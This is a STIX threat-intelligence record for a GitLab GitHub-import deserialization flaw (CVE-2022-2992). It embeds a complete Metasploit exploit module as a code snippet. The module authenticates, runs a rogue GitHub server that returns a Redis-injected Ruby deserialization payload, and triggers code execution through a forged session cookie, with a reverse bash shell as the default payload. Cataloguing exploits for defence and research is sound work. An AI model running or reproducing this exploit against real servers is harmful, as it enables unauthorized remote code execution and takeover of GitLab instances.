{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed217ce4-c82a-4a00-bc8e-21a400c7ef55",
    "created": "2024-08-14T17:07:24.375103Z",
    "modified": "2024-08-14T17:07:24.375107Z",
    "name": "GitLab GitHub Repo Import Deserialization RCE",
    "description": " An authenticated user can import a repository from GitHub into GitLab. If a user attempts to import a repo from an attacker-controlled server the server will reply with a Redis serialization protocol object in the nested `default_branch`. GitLab will cache this object and then deserialize it when trying to load a user session, resulting in RCE. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitlab_github_import_rce_cve_2022_2992.rb",
            "external_id": "gitlab_github_import_rce_cve_2022_2992.rb"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/1679624"
        },
        {
            "source_name": "reference",
            "url": "https://gitlab.com/gitlab-org/gitlab/-/issues/371884"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-2992"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  include Msf::Exploit::Git::SmartHttp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HTTP::Gitlab\n  include Msf::Exploit::RubyDeserialization\n\n  attr_accessor :cookie\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GitLab GitHub Repo Import Deserialization RCE',\n        'Description' => %q{\n          An authenticated user can import a repository from GitHub into GitLab.\n          If a user attempts to import a repo from an attacker-controlled server,\n          the server will reply with a Redis serialization protocol object in the nested\n          `default_branch`. GitLab will cache this object and\n          then deserialize it when trying to load a user session, resulting in RCE.\n        },\n        'Author' => [\n          'William Bowling (vakzz)', # discovery\n          'Heyder Andrade <https://infosec.exchange/@heyder>', # msf module\n          'RedWay Security <https://infosec.exchange/@redway>', # PoC\n        ],\n        'References' => [\n          ['URL', 'https://hackerone.com/reports/1679624'],\n          ['URL', 'https://github.com/redwaysecurity/CVEs/tree/main/CVE-2022-2992'], # PoC\n          ['URL', 'https://gitlab.com/gitlab-org/gitlab/-/issues/371884'],\n          ['CVE', '2022-2992']\n        ],\n        'DisclosureDate' => '2022-10-06',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD],\n        'Privileged' => false,\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),\n        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),\n        OptInt.new('IMPORT_DELAY', [true, 'Time to wait from the import task before try to trigger the payload', 5]),\n        OptAddress.new('URIHOST', [false, 'Host to use in GitHub import URL'])\n      ]\n    )\n    deregister_options('GIT_URI')\n  end\n\n  def group_name\n    @group_name ||= Rex::Text.rand_text_alpha(8..12)\n  end\n\n  def api_token\n    @api_token ||= gitlab_create_personal_access_token\n  end\n\n  def session_id\n    @session_id ||= Rex::Text.rand_text_hex(32)\n  end\n\n  def redis_payload(cmd)\n    serialized_payload = generate_ruby_deserialization_for_command(cmd, :net_writeadapter)\n    gitlab_session_id = \"session:gitlab:#{session_id}\"\n    # A RESP array of 3 elements (https://redis.io/docs/reference/protocol-spec/)\n    # The command set\n    # The gitlab session to load the payload from\n    # The Payload itself. A Ruby serialized command\n    \"*3\\r\\n$3\\r\\nset\\r\\n$#{gitlab_session_id.size}\\r\\n#{gitlab_session_id}\\r\\n$#{serialized_payload.size}\\r\\n#{serialized_payload}\"\n  end\n\n  def check\n    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie\n\n    vprint_status('Trying to get the GitLab version')\n\n    version = Rex::Version.new(gitlab_version)\n\n    return CheckCode::Safe(\"Detected GitLab version #{version} which is not vulnerable\") unless (\n      version.between?(Rex::Version.new('11.10'), Rex::Version.new('15.1.6')) ||\n      version.between?(Rex::Version.new('15.2'), Rex::Version.new('15.2.4')) ||\n      version.between?(Rex::Version.new('15.3'), Rex::Version.new('15.3.2'))\n    )\n\n    report_vuln(\n      host: rhost,\n      name: name,\n      refs: references,\n      info: [version]\n    )\n    return CheckCode::Appears(\"Detected GitLab version #{version} which is vulnerable.\")\n  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError\n    return CheckCode::Detected('Could not detect the version because authentication failed.')\n  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::ClientError => e\n    return CheckCode::Unknown(\"#{e.class} - #{e.message}\")\n  end\n\n  def cleanup\n    super\n    return unless @import_id\n\n    gitlab_delete_group(@group_id, api_token)\n    gitlab_revoke_personal_access_token(api_token)\n    gitlab_sign_out\n  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e\n    print_error(\"#{e.class} - #{e.message}\")\n  end\n\n  def exploit\n    if Rex::Socket.is_internal?(srvhost_addr)\n      print_warning(\"#{srvhost_addr} is an internal address and will not work unless the target GitLab instance is using a non-default configuration.\")\n    end\n\n    setup_repo_structure\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          on_request_uri(cli, req)\n        end,\n        'Path' => '/'\n      }\n    })\n    execute_command(payload.encoded)\n  rescue Timeout::Error => e\n    fail_with(Failure::TimeoutExpired, e.message)\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n    # due to the AutoCheck mixin and the keep_cookies option, the cookie might be already set\n    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie\n    vprint_status(\"Session ID: #{session_id}\")\n    vprint_status(\"Creating group #{group_name}\")\n    # We need group id for the cleanup method\n    @group_id = gitlab_create_group(group_name, api_token)['id']\n    fail_with(Failure::UnexpectedReply, 'Failed to create a new group') unless @group_id\n    @redis_payload = redis_payload(cmd)\n    # import a repository from GitHub\n    vprint_status('Importing a repository from GitHub')\n    @import_id = gitlab_import_github_repo(\n      group_name: group_name,\n      github_hostname: get_uri,\n      api_token: api_token\n    )['id']\n\n    fail_with(Failure::UnexpectedReply, 'Failed to import a repository from GitHub') unless @import_id\n    # wait for the import tasks to finish\n    select(nil, nil, nil, datastore['IMPORT_DELAY'])\n    # execute the payload\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, group_name),\n      'method' => 'GET',\n      'keep_cookies' => false,\n      'cookie' => \"_gitlab_session=#{session_id}\"\n    })\n  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e\n    fail_with(Failure::Unknown, \"#{e.class} - #{e.message}\")\n  end\n\n  def setup_repo_structure\n    blob_object_fname = \"#{Rex::Text.rand_text_alpha(5..10)}.txt\"\n    blob_data = Rex::Text.rand_text_alpha(5..12)\n    blob_object = Msf::Exploit::Git::GitObject.build_blob_object(blob_data)\n\n    tree_data =\n      {\n        mode: '100644',\n        file_name: blob_object_fname,\n        sha1: blob_object.sha1\n      }\n    tree_object = Msf::Exploit::Git::GitObject.build_tree_object(tree_data)\n\n    commit_obj = Msf::Exploit::Git::GitObject.build_commit_object(tree_sha1: tree_object.sha1)\n\n    git_objs = [ commit_obj, tree_object, blob_object ]\n\n    @refs =\n      {\n        'HEAD' => 'refs/heads/main',\n        'refs/heads/main' => commit_obj.sha1\n      }\n    @packfile = Msf::Exploit::Git::Packfile.new('2', git_objs)\n  end\n\n  # Handle incoming requests from GitLab server\n  def on_request_uri(cli, req)\n    super\n    headers = { 'Content-Type' => 'application/json' }\n    data = {}.to_json\n    case req.uri\n    when %r{/api/v3/rate_limit}\n      headers.merge!({\n        'X-RateLimit-Limit' => '100000',\n        'X-RateLimit-Remaining' => '100000'\n      })\n    when %r{/api/v3/repositories/(\\w{1,20})}\n      id = Regexp.last_match(1)\n      name = Rex::Text.rand_text_alpha(8..12)\n      data = {\n        id: id,\n        name: name,\n        full_name: \"#{name}/name\",\n        clone_url: \"#{get_uri.gsub(%r{/+$}, '')}/#{name}/public.git\"\n      }.to_json\n    when %r{/\\w+/public.git/info/refs}\n      data = build_pkt_line_advertise(@refs)\n      headers.merge!({ 'Content-Type' => 'application/x-git-upload-pack-advertisement' })\n    when %r{/\\w+/public.git/git-upload-pack}\n      data = build_pkt_line_sideband(@packfile)\n      headers.merge!({ 'Content-Type' => 'application/x-git-upload-pack-result' })\n    when %r{/api/v3/repos/\\w+/\\w+}\n      bytes_size = rand(3..8)\n      data = {\n        'default_branch' => {\n          'to_s' => {\n            'bytesize' => bytes_size,\n            'to_s' => \"+#{Rex::Text.rand_text_alpha_lower(bytes_size)}\\r\\n#{@redis_payload}\"\n            # using a simple string format for RESP\n          }\n        }\n      }.to_json\n    end\n    send_response(cli, data, headers)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-10-06",
    "x_mitre_platforms": [
        "unix'"
    ]
}